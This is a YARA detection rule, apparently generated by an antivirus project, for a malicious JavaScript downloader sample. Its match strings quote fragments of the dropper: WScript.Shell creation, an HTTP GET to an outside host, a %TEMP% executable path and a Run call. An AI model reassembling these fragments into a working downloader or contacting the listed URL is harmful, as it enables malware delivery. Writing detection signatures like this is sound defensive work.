rule sig_20160328_c0606b9f7bd784784eca085fba463076 {
  meta:
    description = "datamaliciousorder - file 20160328_c0606b9f7bd784784eca085fba463076.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "31cbce79cf2e4f54e2117678a538180e3ce852737b6fba8c707ef76abbf5f26f"

  strings:
    $s1  = "function Gkbrvhfeca() {return Jyhhctii[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"3eaPWOJdF7B.exe\";};" fullword ascii
    $s2  = "function Yeawtjr(Dwdvz, Ijorg){return Dwdvz - Ijorg;};" fullword ascii
    $s3  = "var Jyhhctii = function Uaprnwg() {return WScript[Panan](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Clgfi](Fvknke() * 11)} while (Gdcaarvdqq[\"readystate\"] < 2 * 2);" fullword ascii
    $s5  = "Gdcaarvdqq[Ckrkhtcnzf](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s6  = "function Ronjndnu(Pifjbt){Jyhhctii[\"Run\"](Pifjbt, Eijqrzhtgx, Eijqrzhtgx);};" fullword ascii
    $s7  = "function Vasbfgbje() {return ((Agjfol == true) && (Agjfol == Phcynwu)) ? 1 : Eijqrzhtgx;};" fullword ascii
    $s8  = "var Agjfol = false;" fullword ascii
    $s9  = "Phcynwu = true; " fullword ascii
    $s10 = "var Bnwliychym = new this[\"Date\"]();" fullword ascii
    $s11 = "function Ruyoeueasn(Cnpzr) {var Qxwaydz = (1, 2, 3, 4, 5, Cnpzr); return Qxwaydz;};" fullword ascii
    $s12 = "function Nzphru(){return Gloov;};" fullword ascii
    $s13 = "return Yeawtjr(Badld, Fbierrge);" fullword ascii
    $s14 = " while (Hsuseasjvu){" fullword ascii
    $s15 = "Agjfol = true; " fullword ascii
    $s16 = "var Phcynwu = false;" fullword ascii
    $s17 = "function Fvknke(){return 22;};" fullword ascii
    $s18 = "var Lgddlpf = false;" fullword ascii
    $s19 = "function Gnagblmm(){return Panan;};" fullword ascii
    $s20 = "function Guednktbp()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}